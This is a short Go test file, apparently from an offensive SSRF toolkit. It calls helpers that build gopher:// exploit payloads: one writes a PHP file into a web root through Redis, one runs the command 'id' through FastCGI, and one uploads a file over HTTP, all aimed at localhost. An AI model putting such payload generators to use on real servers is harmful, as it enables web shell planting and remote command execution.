package gopher

import (
	"fmt"
	"testing"
)

func TestRedisWriteAnyFile(t *testing.T) {
	p, _ := GopherRedisWriteExp("127.0.0.1:80", "/var/www/html/", "xxx.php", "Hello world")
	fmt.Println(p)
}

func TestExpFastCGI(t *testing.T) {
	p, _ := GopherFastCGIExp("127.0.0.1:80", "id", "/usr/share/php/PEAR.php")
	fmt.Println(p)
}

func TestExpHTTPUpload(t *testing.T) {
	// gopher_test.go
	p, _ := GopherHTTPUploadExp("127.0.0.1:80", "/",
		map[string]string{
			"a":    "b",
			"file": "@gopher_test.go",
		})
	fmt.Println(p)
}

func TestExpGopher(t *testing.T) {
	t.SkipNow()
	p, err := GenGopherExpByListen("127.0.0.1:6379", 9527, false)
	if err != nil {
		fmt.Println(err)
		t.Fail()
	}
	fmt.Println(p)
}
